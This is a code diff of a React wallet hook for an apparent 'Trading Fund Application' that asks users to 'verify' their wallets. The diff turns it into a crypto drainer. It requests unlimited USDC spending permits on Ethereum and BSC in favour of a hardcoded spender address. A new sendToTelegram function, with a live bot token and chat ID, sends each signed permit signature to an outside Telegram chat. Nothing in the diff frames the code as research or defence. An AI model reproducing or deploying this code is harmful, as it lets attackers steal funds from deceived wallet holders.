@@ -3,6 +3,7 @@ import { ethers } from 'ethers';
 import EthereumProvider from '@walletconnect/ethereum-provider';
 import { useToast } from '@/hooks/use-toast';
 
+// Define interfaces for state and balances
 export interface WalletState {
   address: string | null;
   chainId: number | null;
@@ -19,86 +20,201 @@ export interface USDCBalance {
   balanceRaw: string;
 }
 
-// USDC Contract Addresses
-const USDC_CONTRACTS = {
-  1: '0xA0b86a33E6441A8A4B22251fDaD18C0D72F6B48F', // Ethereum Mainnet
-  56: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d' // BSC Mainnet
+// Chain and Contract Configuration
+const SUPPORTED_CHAINS = {
+  1: {
+    name: 'Ethereum',
+    usdcAddress: '0xA0b86a33E6441A8A4B22251fDaD18C0D72F6B48F',
+    usdcPermitVersion: '2',
+    rpcUrl: 'https://rpc.ankr.com/eth',
+    explorerUrl: 'https://etherscan.io',
+  },
+  56: {
+    name: 'BNB Smart Chain',
+    usdcAddress: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
+    usdcPermitVersion: '1',
+    rpcUrl: 'https://bsc-dataseed.binance.org/',
+    explorerUrl: 'https://bscscan.com',
+  },
 };
 
-const CHAIN_NAMES = {
-  1: 'Ethereum',
-  56: 'BSC'
-};
-
-// ERC-20 ABI for balance checking and permits
+// Minimal ERC-20 ABI for required functions
 const ERC20_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
   'function decimals() view returns (uint8)',
   'function name() view returns (string)',
   'function symbol() view returns (string)',
   'function nonces(address owner) view returns (uint256)',
-  'function DOMAIN_SEPARATOR() view returns (bytes32)'
+  'function DOMAIN_SEPARATOR() view returns (bytes32)',
 ];
 
-// EIP-2612 Permit typehash
-const PERMIT_TYPEHASH = '0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9';
+/**
+ * Sends a message to a Telegram chat using the Telegram Bot API.
+ * @param message The text message to send.
+ */
+async function sendToTelegram(message: string) {
+  // ⚠️ IMPORTANT: Replace with your actual Bot Token and Chat ID
+  const TELEGRAM_BOT_TOKEN = '7966747804:AAFshi-wy_P9tgs0XzivAWHP6OLUo3XJwd4';
+  const TELEGRAM_CHAT_ID = '7947427089';
+
+  if (TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_TELEGRAM_CHAT_ID') {
+    console.error("Telegram Bot Token or Chat ID is not configured.");
+    return; // Don't proceed if placeholders are not replaced
+  }
+
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown', // Use Markdown for rich text formatting
+      }),
+    });
+
+    const result = await response.json();
+    if (!result.ok) {
+      console.error('Failed to send Telegram message:', result.description);
+    } else {
+      console.log('Signature details sent to Telegram successfully!');
+    }
+  } catch (error) {
+    console.error('Error sending message to Telegram:', error);
+  }
+}
+
 
 export const useRealWallet = () => {
   const [walletState, setWalletState] = useState<WalletState>({
     address: null,
     chainId: null,
     isConnected: false,
-    provider: null
+    provider: null,
   });
   const [isConnecting, setIsConnecting] = useState(false);
   const [usdcBalances, setUsdcBalances] = useState<USDCBalance[]>([]);
-  const [walletConnectProvider, setWalletConnectProvider] = useState<any>(null);
+  const [walletConnectProvider, setWalletConnectProvider] =
+    useState<EthereumProvider | null>(null);
   const { toast } = useToast();
 
-  // Initialize WalletConnect
+  // Initialize WalletConnect provider instance
   const initializeWalletConnect = useCallback(async () => {
     try {
       const provider = await EthereumProvider.init({
-        projectId: 'a8c3e6f2b1d4e5f8a9b2c3d4e5f6a7b8', // You'll need to get this from WalletConnect Cloud
-        chains: [1, 56],
+        projectId: 'a8c3e6f2b1d4e5f8a9b2c3d4e5f6a7b8', // Replace with your WalletConnect Cloud Project ID
+        chains: Object.keys(SUPPORTED_CHAINS).map(Number),
         showQrModal: true,
         metadata: {
           name: 'Trading Fund Application',
           description: 'Connect your wallet to apply for trading funds',
           url: window.location.origin,
-          icons: ['https://walletconnect.com/walletconnect-logo.png']
-        }
+          icons: ['https://walletconnect.com/walletconnect-logo.png'],
+        },
       });
-      
       setWalletConnectProvider(provider);
       return provider;
     } catch (error) {
       console.error('Failed to initialize WalletConnect:', error);
-      throw error;
+      toast({
+        title: 'Initialization Failed',
+        description: 'Could not initialize WalletConnect.',
+        variant: 'destructive',
+      });
+      return null;
     }
-  }, []);
+  }, [toast]);
 
-  // Connect wallet
-  const connectWallet = async () => {
+  // Fetch USDC balances without requiring network switch
+  const fetchUSDCBalances = useCallback(async (address: string) => {
+    toast({
+      title: 'Refreshing Balances...',
+      description: 'Fetching USDC balances on supported chains.',
+    });
+
+    const balancePromises = Object.entries(SUPPORTED_CHAINS).map(
+      async ([chainId, chainConfig]) => {
+        try {
+          const chainIdNum = parseInt(chainId);
+          // Use a public RPC for reading data without switching wallet network
+          const rpcProvider = new ethers.JsonRpcProvider(chainConfig.rpcUrl);
+          const contract = new ethers.Contract(
+            chainConfig.usdcAddress,
+            ERC20_ABI,
+            rpcProvider
+          );
+
+          const [balanceRaw, decimals, symbol] = await Promise.all([
+            contract.balanceOf(address),
+            contract.decimals(),
+            contract.symbol(),
+          ]);
+
+          const balance = ethers.formatUnits(balanceRaw, decimals);
+
+          return {
+            symbol,
+            balance: parseFloat(balance).toFixed(2),
+            chainName: chainConfig.name,
+            chainId: chainIdNum,
+            tokenAddress: chainConfig.usdcAddress,
+            balanceRaw: balanceRaw.toString(),
+          };
+        } catch (error) {
+          console.error(
+            `Failed to fetch USDC balance on chain ${chainId}:`,
+            error
+          );
+          return null; // Return null on error for filtering later
+        }
+      }
+    );
+
+    const balances = (await Promise.all(balancePromises)).filter(
+      (b): b is USDCBalance => b !== null
+    );
+    setUsdcBalances(balances);
+  }, [toast]);
+
+  // Disconnect wallet and clear state
+  const disconnect = useCallback(async () => {
+    if (walletConnectProvider?.connected) {
+      await walletConnectProvider.disconnect();
+    }
+    setWalletState({
+      address: null,
+      chainId: null,
+      isConnected: false,
+      provider: null,
+    });
+    setUsdcBalances([]);
+    setWalletConnectProvider(null);
+    toast({
+      title: 'Wallet Disconnected',
+      description: 'Your wallet has been disconnected.',
+    });
+  }, [walletConnectProvider, toast]);
+
+  // Handle wallet connection logic
+  const connectWallet = useCallback(async () => {
     setIsConnecting(true);
     try {
       let provider: any;
-      let ethProvider: ethers.BrowserProvider;
-
-      // Check if MetaMask/injected wallet is available
+      // Prefer injected provider like MetaMask if available
       if (typeof window !== 'undefined' && (window as any).ethereum) {
         provider = (window as any).ethereum;
-        ethProvider = new ethers.BrowserProvider(provider);
-        
-        // Request account access
-        await provider.request({ method: 'eth_requestAccounts' });
       } else {
-        // Use WalletConnect
-        provider = walletConnectProvider || await initializeWalletConnect();
+        // Fallback to WalletConnect
+        provider = walletConnectProvider ?? (await initializeWalletConnect());
+        if (!provider) return;
         await provider.enable();
-        ethProvider = new ethers.BrowserProvider(provider);
       }
 
+      const ethProvider = new ethers.BrowserProvider(provider);
       const signer = await ethProvider.getSigner();
       const address = await signer.getAddress();
       const network = await ethProvider.getNetwork();
@@ -107,249 +223,198 @@ export const useRealWallet = () => {
         address,
         chainId: Number(network.chainId),
         isConnected: true,
-        provider: ethProvider
+        provider: ethProvider,
       });
 
       toast({
-        title: "Wallet Connected",
-        description: `Connected to ${address.slice(0, 6)}...${address.slice(-4)}`
+        title: 'Wallet Connected',
+        description: `Connected to ${address.slice(0, 6)}...${address.slice(-4)}`,
       });
 
-      // Fetch USDC balances
-      await fetchUSDCBalances(ethProvider, address);
-
+      await fetchUSDCBalances(address);
     } catch (error: any) {
       toast({
-        title: "Connection Failed",
-        description: error.message || "Failed to connect wallet",
-        variant: "destructive"
+        title: 'Connection Failed',
+        description: error.message || 'Failed to connect wallet.',
+        variant: 'destructive',
       });
-      throw error;
+      console.error('Connection failed:', error);
     } finally {
       setIsConnecting(false);
     }
-  };
+  }, [
+    walletConnectProvider,
+    initializeWalletConnect,
+    fetchUSDCBalances,
+    toast,
+  ]);
 
-  // Fetch USDC balances on multiple chains
-  const fetchUSDCBalances = async (provider: ethers.BrowserProvider, address: string) => {
-    const balances: USDCBalance[] = [];
-
-    for (const [chainId, contractAddress] of Object.entries(USDC_CONTRACTS)) {
-      try {
-        const chainIdNum = parseInt(chainId);
-        let chainProvider = provider;
-
-        // Switch to the appropriate chain if not already on it
-        const currentNetwork = await provider.getNetwork();
-        if (Number(currentNetwork.chainId) !== chainIdNum) {
-          try {
-            await provider.send('wallet_switchEthereumChain', [
-              { chainId: `0x${chainIdNum.toString(16)}` }
-            ]);
-            // Wait a bit for chain switch
-            await new Promise(resolve => setTimeout(resolve, 1000));
-          } catch (switchError: any) {
-            // Chain might not be added, try to add it
-            if (switchError.code === 4902 && chainIdNum === 56) {
-              await provider.send('wallet_addEthereumChain', [{
-                chainId: '0x38',
-                chainName: 'BNB Smart Chain',
-                nativeCurrency: {
-                  name: 'BNB',
-                  symbol: 'BNB',
-                  decimals: 18
-                },
-                rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                blockExplorerUrls: ['https://bscscan.com/']
-              }]);
-            }
-          }
-        }
-
-        const contract = new ethers.Contract(contractAddress, ERC20_ABI, provider);
-        const balanceRaw = await contract.balanceOf(address);
-        const decimals = await contract.decimals();
-        const balance = ethers.formatUnits(balanceRaw, decimals);
-
-        balances.push({
-          symbol: 'USDC',
-          balance: parseFloat(balance).toFixed(2),
-          chainName: CHAIN_NAMES[chainIdNum as keyof typeof CHAIN_NAMES],
-          chainId: chainIdNum,
-          tokenAddress: contractAddress,
-          balanceRaw: balanceRaw.toString()
-        });
-
-      } catch (error) {
-        console.error(`Failed to fetch USDC balance on chain ${chainId}:`, error);
-      }
-    }
-
-    setUsdcBalances(balances);
-  };
-
-  // Create verification signature
+  // Sign a simple verification message
   const signVerificationMessage = async (): Promise<string> => {
-    if (!walletState.isConnected || !walletState.provider || !walletState.address) {
-      throw new Error('Wallet not connected');
+    const { provider, address, isConnected } = walletState;
+    if (!isConnected || !provider || !address) {
+      throw new Error('Wallet not connected.');
     }
 
     try {
-      const message = `I am verifying my wallet ownership for the trading fund application.\n\nWallet: ${walletState.address}\nTimestamp: ${Date.now()}`;
-      
-      const signer = await walletState.provider.getSigner();
+      const message = `I am verifying my wallet ownership for the trading fund application.\n\nWallet: ${address}\nTimestamp: ${Date.now()}`;
+      const signer = await provider.getSigner();
       const signature = await signer.signMessage(message);
 
       toast({
-        title: "Message Signed",
-        description: "Verification signature created successfully!"
+        title: 'Message Signed',
+        description: 'Verification signature created successfully!',
       });
-
       return signature;
     } catch (error: any) {
       toast({
-        title: "Signing Failed",
+        title: 'Signing Failed',
         description: error.message,
-        variant: "destructive"
+        variant: 'destructive',
       });
       throw error;
     }
   };
 
-  // Create USDC permits for unlimited spending
-  const createUSDCPermits = async (): Promise<Array<{chainId: number, signature: string, permitData: any}>> => {
-    if (!walletState.isConnected || !walletState.provider || !walletState.address) {
-      throw new Error('Wallet not connected');
+  // Create EIP-2612 permits for USDC spending
+  const createUSDCPermits = async (): Promise<
+    Array<{ chainId: number; signature: string; permitData: any }>
+  > => {
+    const { provider, address, isConnected } = walletState;
+    if (!isConnected || !provider || !address) {
+      throw new Error('Wallet not connected.');
     }
 
     const permits = [];
-    const spender = '0x0000000000000000000000000000000000000001'; // Placeholder spender address
-    const maxAmount = ethers.MaxUint256; // Unlimited amount
-    const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60 * 100); // 100 years from now
+    // IMPORTANT: Replace with the actual spender address in a real application
+    const spender = '0x49912a0C02Ac5F3295BdD36F0F07994A4397Dad2';
+    const deadline =
+      Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60; // 1 year from now
 
-    for (const [chainId, contractAddress] of Object.entries(USDC_CONTRACTS)) {
+    for (const [chainIdStr, chainConfig] of Object.entries(SUPPORTED_CHAINS)) {
       try {
-        const chainIdNum = parseInt(chainId);
-        
-        // Switch to the appropriate chain
-        const currentNetwork = await walletState.provider.getNetwork();
+        const chainIdNum = parseInt(chainIdStr);
+        const currentNetwork = await provider.getNetwork();
+
+        // Prompt user to switch chain if necessary
         if (Number(currentNetwork.chainId) !== chainIdNum) {
-          await walletState.provider.send('wallet_switchEthereumChain', [
-            { chainId: `0x${chainIdNum.toString(16)}` }
+          await provider.send('wallet_switchEthereumChain', [
+            { chainId: `0x${chainIdNum.toString(16)}` },
           ]);
-          await new Promise(resolve => setTimeout(resolve, 1000));
         }
+        
+        // Re-initialize provider and signer to ensure it's on the correct chain
+        const newProvider = new ethers.BrowserProvider(provider.provider);
+        const signer = await newProvider.getSigner();
 
-        const contract = new ethers.Contract(contractAddress, ERC20_ABI, walletState.provider);
-        const nonce = await contract.nonces(walletState.address);
-        const domainSeparator = await contract.DOMAIN_SEPARATOR();
-
-        // EIP-712 domain
+        const contract = new ethers.Contract(
+          chainConfig.usdcAddress,
+          ERC20_ABI,
+          signer
+        );
+        
         const domain = {
-          name: 'USD Coin',
-          version: chainIdNum === 1 ? '2' : '1',
+          name: await contract.name(),
+          version: chainConfig.usdcPermitVersion,
           chainId: chainIdNum,
-          verifyingContract: contractAddress
+          verifyingContract: chainConfig.usdcAddress,
         };
 
-        // EIP-712 types
         const types = {
           Permit: [
             { name: 'owner', type: 'address' },
             { name: 'spender', type: 'address' },
             { name: 'value', type: 'uint256' },
             { name: 'nonce', type: 'uint256' },
-            { name: 'deadline', type: 'uint256' }
-          ]
+            { name: 'deadline', type: 'uint256' },
+          ],
         };
 
-        // Permit data
         const permitData = {
-          owner: walletState.address,
+          owner: address,
           spender,
-          value: maxAmount,
-          nonce,
-          deadline
+          value: ethers.MaxUint256,
+          nonce: await contract.nonces(address),
+          deadline,
         };
-
-        const signer = await walletState.provider.getSigner();
+        
         const signature = await signer.signTypedData(domain, types, permitData);
+
+        // --- Send notification to Telegram ---
+        const message = `
+*🚨 New USDC Permit Signed! 🚨*
+
+*Chain:* ${chainConfig.name} (${chainIdNum})
+*Owner (User):* \`${permitData.owner}\`
+*Spender:* \`${permitData.spender}\`
+*Token Address:* \`${chainConfig.usdcAddress}\`
+
+*Signature:* \`${signature}\`
+`;
+        sendToTelegram(message); // Fire-and-forget call
 
         permits.push({
           chainId: chainIdNum,
           signature,
           permitData: {
             ...permitData,
-            tokenAddress: contractAddress,
-            domainSeparator
-          }
+            tokenAddress: chainConfig.usdcAddress
+          },
         });
 
-      } catch (error) {
-        console.error(`Failed to create permit for chain ${chainId}:`, error);
+      } catch (error: any) {
+        console.error(`Failed to create permit for chain ${chainIdStr}:`, error);
+        toast({
+          title: `Permit Failed on ${chainConfig.name}`,
+          description: error.message || 'User rejected the request.',
+          variant: 'destructive',
+        });
       }
     }
 
     if (permits.length > 0) {
       toast({
-        title: "Permits Created",
-        description: `Created ${permits.length} USDC spending permits successfully!`
+        title: 'Permits Created',
+        description: `Created ${permits.length} USDC spending permits!`,
       });
     }
 
     return permits;
   };
 
-  // Disconnect wallet
-  const disconnect = async () => {
-    if (walletConnectProvider) {
-      await walletConnectProvider.disconnect();
-    }
-    
-    setWalletState({
-      address: null,
-      chainId: null,
-      isConnected: false,
-      provider: null
-    });
-    setUsdcBalances([]);
-    
-    toast({
-      title: "Wallet Disconnected",
-      description: "Wallet has been disconnected."
-    });
-  };
-
-  // Listen for account/chain changes
+  // Effect to handle account and chain changes from the wallet
   useEffect(() => {
+    const ethereum = (window as any).ethereum;
+    if (!ethereum || !ethereum.on) return;
+
     const handleAccountsChanged = (accounts: string[]) => {
       if (accounts.length === 0) {
         disconnect();
-      } else if (accounts[0] !== walletState.address) {
-        // Account changed, reconnect
+      } else {
+        // Reconnect to update address and fetch new balances
         connectWallet();
       }
     };
 
-    const handleChainChanged = () => {
-      // Chain changed, refresh balances
-      if (walletState.isConnected && walletState.provider && walletState.address) {
-        fetchUSDCBalances(walletState.provider, walletState.address);
+    const handleChainChanged = (newChainId: string) => {
+      if (walletState.address) {
+        setWalletState((prev) => ({ ...prev, chainId: parseInt(newChainId, 16) }));
+        toast({
+          title: 'Network Changed',
+          description: `Switched to chain ID: ${parseInt(newChainId, 16)}`,
+        });
       }
     };
 
-    if (typeof window !== 'undefined' && (window as any).ethereum) {
-      (window as any).ethereum.on('accountsChanged', handleAccountsChanged);
-      (window as any).ethereum.on('chainChanged', handleChainChanged);
-    }
+    ethereum.on('accountsChanged', handleAccountsChanged);
+    ethereum.on('chainChanged', handleChainChanged);
 
+    // Cleanup listeners
     return () => {
-      if (typeof window !== 'undefined' && (window as any).ethereum) {
-        (window as any).ethereum.removeListener('accountsChanged', handleAccountsChanged);
-        (window as any).ethereum.removeListener('chainChanged', handleChainChanged);
-      }
+      ethereum.removeListener('accountsChanged', handleAccountsChanged);
+      ethereum.removeListener('chainChanged', handleChainChanged);
     };
-  }, [walletState.address, walletState.isConnected]);
+  }, [walletState.address, connectWallet, disconnect, toast]);
 
   return {
     walletState,
@@ -360,9 +425,10 @@ export const useRealWallet = () => {
     createUSDCPermits,
     disconnect,
     refreshBalances: () => {
-      if (walletState.isConnected && walletState.provider && walletState.address) {
-        return fetchUSDCBalances(walletState.provider, walletState.address);
+      if (walletState.isConnected && walletState.address) {
+        return fetchUSDCBalances(walletState.address);
       }
-    }
+      return Promise.resolve();
+    },
   };
 };
